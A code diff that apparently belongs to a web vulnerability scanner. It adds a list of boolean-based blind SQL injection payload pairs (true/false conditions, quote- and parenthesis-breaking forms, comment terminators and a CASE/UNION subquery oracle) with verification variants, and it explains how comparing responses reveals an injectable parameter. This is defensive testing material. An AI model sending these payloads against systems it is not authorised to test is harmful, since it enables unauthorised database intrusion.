@@ -42,6 +42,52 @@ SQLI_TIME_DIFF_PAIRS = [
     },
 ]
 
+# Boolean-based blind SQLi. Each family injects a condition that is always TRUE
+# and one that is always FALSE, appended to the parameter's existing value. A
+# vulnerable endpoint returns (near-)identical content for the TRUE payload and
+# the baseline, but diverges for the FALSE payload. Each family also carries a
+# verification pair with *different* constants so a positive can be re-confirmed,
+# which drives false positives close to zero. The case/union family additionally
+# forces a subquery cardinality error on FALSE, so it works even on engines with
+# no usable time-delay function (e.g. Presto/Trino via a CASE oracle).
+SQLI_BOOLEAN_PAIRS = [
+    {
+        "name": "numeric_and",
+        "true": " AND 1=1",
+        "false": " AND 1=2",
+        "verify_true": " AND 8=8",
+        "verify_false": " AND 8=9",
+    },
+    {
+        "name": "quote_and",
+        "true": "' AND '1'='1",
+        "false": "' AND '1'='2",
+        "verify_true": "' AND '8'='8",
+        "verify_false": "' AND '8'='9",
+    },
+    {
+        "name": "case_union",
+        "true": " AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)",
+        "false": " AND 1=(SELECT CASE WHEN (1=2) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)",
+        "verify_true": " AND 1=(SELECT CASE WHEN (8=8) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)",
+        "verify_false": " AND 1=(SELECT CASE WHEN (8=9) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)",
+    },
+    {
+        "name": "comment_quote",
+        "true": "' AND 1=1-- -",
+        "false": "' AND 1=2-- -",
+        "verify_true": "' AND 8=8-- -",
+        "verify_false": "' AND 8=9-- -",
+    },
+    {
+        "name": "paren_numeric",
+        "true": ") AND (1=1",
+        "false": ") AND (1=2",
+        "verify_true": ") AND (8=8",
+        "verify_false": ") AND (8=9",
+    },
+]
+
 SQLI_PARAM_HINTS = {
     "id",
     "custordid",
